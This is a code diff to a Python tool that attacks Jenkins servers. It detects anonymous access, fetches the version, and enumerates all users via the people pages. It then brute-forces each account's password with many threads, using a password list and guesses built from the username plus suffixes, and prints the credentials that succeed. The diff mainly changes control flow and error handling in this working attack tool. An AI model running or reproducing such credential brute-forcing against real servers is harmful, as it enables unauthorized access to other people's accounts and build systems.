@@ -48,7 +48,6 @@ class BrustThread(threading.Thread):
         self.timeout = timeout
         self.try_timeout_cnt = 3
 
-
     def run(self):
         while BRUST_USER_QUEUE.qsize() > 0:
             user_pwd_info = BRUST_USER_QUEUE.get()
@@ -70,7 +69,8 @@ class BrustThread(threading.Thread):
 
         except urllib2.HTTPError,e:
             if e.code == 404:
-                print 'error'
+                color_output(u'[-]....brust url error:%d' % e.code)
+                sys.exit()
             elif e.code == 301 or e.code == 302:
                     result = re.findall(u'(.*)loginError', e.headers['Location'])
                     if len(result) != 0:
@@ -276,55 +276,54 @@ class Jenkins(object):
         print '* Detect Jenkins anonymous access'
         print '-' * 50
         info, status = self.__bAnonymous_access()
-        #if status == 1 and not info:
-
-        print '-' * 50
-        print '* Get Jenkins Version'
-        print '-' * 50
-        self.__get_version()
-
-        print '-' * 50
-        print '* Get Jenkins All user'
-        print '-' * 50
-
-        if self.user_link == PEOPLE_PERFIX:
-            self.get_all_user_by_people()
-        elif self.user_link == ASYNCH_PEOPEL_PERFIX:
-            self.get_all_user_by_async()
-
-        color_output('[+]....Jenkins All user count:%d' % len(self.user_list), True)
-        if len(self.user_list) != 0:
-
-            for user in self.user_list:
-                for pwd in self.pwd_list:
-                    BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":0})
-                #动态生成密码
-                for suffix_pwd in self.pwd_suffix:
-                    BRUST_USER_QUEUE.put_nowait({"user":user,"password":user + suffix_pwd, "count":0})
+        if status == 1 and not info:
+            print '-' * 50
+            print '* Get Jenkins Version'
+            print '-' * 50
+            self.__get_version()
 
             print '-' * 50
-            print '* Brust All Jenkins User'
+            print '* Get Jenkins All user'
             print '-' * 50
 
-            threads = []
-            for i in range(self.thread_num):
-                brustthread = BrustThread(self.brust_url)
-                threads.append(brustthread)
+            if self.user_link == PEOPLE_PERFIX:
+                self.get_all_user_by_people()
+            elif self.user_link == ASYNCH_PEOPEL_PERFIX:
+                self.get_all_user_by_async()
 
-            for brustthread in threads:
-                brustthread.start()
+            color_output('[+]....Jenkins All user count:%d' % len(self.user_list), True)
+            if len(self.user_list) != 0:
 
-            for brustthread in threads:
-                brustthread.join()
+                for user in self.user_list:
+                    for pwd in self.pwd_list:
+                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":pwd, "count":0})
+                    #动态生成密码
+                    for suffix_pwd in self.pwd_suffix:
+                        BRUST_USER_QUEUE.put_nowait({"user":user,"password":user + suffix_pwd, "count":0})
 
-            if  SUC_USER_QUEUE.qsize() > 0:
                 print '-' * 50
-                print '* Brust All User Success Result'
+                print '* Brust All Jenkins User'
                 print '-' * 50
-                print 'total success count : %d' % SUC_USER_QUEUE.qsize()
-                while SUC_USER_QUEUE.qsize() > 0:
-                    suc_user_dic = SUC_USER_QUEUE.get_nowait()
-                    color_output('User:%s, Password:%s' % (suc_user_dic['user'], suc_user_dic['pwd']))
+
+                threads = []
+                for i in range(self.thread_num):
+                    brustthread = BrustThread(self.brust_url)
+                    threads.append(brustthread)
+
+                for brustthread in threads:
+                    brustthread.start()
+
+                for brustthread in threads:
+                    brustthread.join()
+
+                if  SUC_USER_QUEUE.qsize() > 0:
+                    print '-' * 50
+                    print '* Brust All User Success Result'
+                    print '-' * 50
+                    print 'total success count : %d' % SUC_USER_QUEUE.qsize()
+                    while SUC_USER_QUEUE.qsize() > 0:
+                        suc_user_dic = SUC_USER_QUEUE.get_nowait()
+                        color_output('User:%s, Password:%s' % (suc_user_dic['user'], suc_user_dic['pwd']))
 
 
     def test(self):
